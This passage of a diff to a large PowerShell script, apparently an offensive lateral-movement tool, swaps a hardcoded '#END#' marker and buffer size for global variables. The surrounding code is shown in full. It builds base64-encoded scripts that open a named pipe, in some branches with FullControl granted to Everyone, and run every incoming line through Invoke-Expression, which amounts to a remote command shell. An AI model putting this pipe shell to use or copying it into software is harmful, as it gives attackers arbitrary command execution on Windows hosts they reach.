-			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 	
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -3195,7 +3195,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					Write-Output ""
 					break
 				} else {
@@ -3289,8 +3289,8 @@ function InteractWithPipeSession{
 			$PN = $global:MultiPipeName
 			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 			
-			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 	
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -3361,7 +3361,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					Write-Output ""
 					break
 				} else {
@@ -3443,8 +3443,8 @@ function InteractWithPipeSession{
 			$PN = $global:MultiPipeName
 			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 			
-			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
-			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
 	
 			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 			
@@ -3483,7 +3483,7 @@ function InteractWithPipeSession{
 			while ($true) {
 				$line = $sr.ReadLine()
 
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					Write-Output ""
 					break
 				} else {
@@ -3546,7 +3546,7 @@ function InteractWithPipeSession{
 				
 				while($true){
 					$line = $sr.ReadLine()
-					if ($line -eq "#END#") {
+					if ($line -eq $global:EndMarker) {
 						break
 					}
 				}
@@ -3608,7 +3608,7 @@ function InteractWithPipeSession{
 			$output = ""
 			while ($true) {
 				$line = $sr.ReadLine()
-				if ($line -eq "#END#") {
+				if ($line -eq $global:EndMarker) {
 					return $output
 				}
 				$output += "$line`n"
@@ -4920,7 +4920,7 @@ while (`$true) {
 		`$errorMessage = `$_.Exception.Message
 		`$errorMessage -split "`r?`n" | ForEach-Object {`$sw.WriteLine(`$_)}
 	}
-	`$sw.WriteLine("#END#")
+	`$sw.WriteLine("$($global:EndMarker)")
 	`$sw.Flush()
 }
 `$pipeClient.Close()
@@ -4973,7 +4973,7 @@ while (`$true) {
 	$accessRule = New-Object System.IO.Pipes.PipeAccessRule($everyone, "FullControl", "Allow")
 	$securityDescriptor.AddAccessRule($accessRule)
 	
-	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor)
+	$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, 'InOut', 1, 'Byte', 'None', $global:BufferSize, $global:BufferSize, $securityDescriptor)
 	
 	$psScript = "Start-Sleep -Seconds 30; `$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(`".`", `"$pipeName`", 'InOut'); `$dummyPipeClient.Connect(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient); `$sw.WriteLine(`"dummyhostdropconnection,`$(Get-Location)`"); `$sw.Flush(); `$dummyPipeClient.Close()"
 	
@@ -5046,7 +5046,7 @@ function Detached-Interaction {
 	
 	$PN = $PipeName
 	
-	$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
+	$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 	
 	$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 	
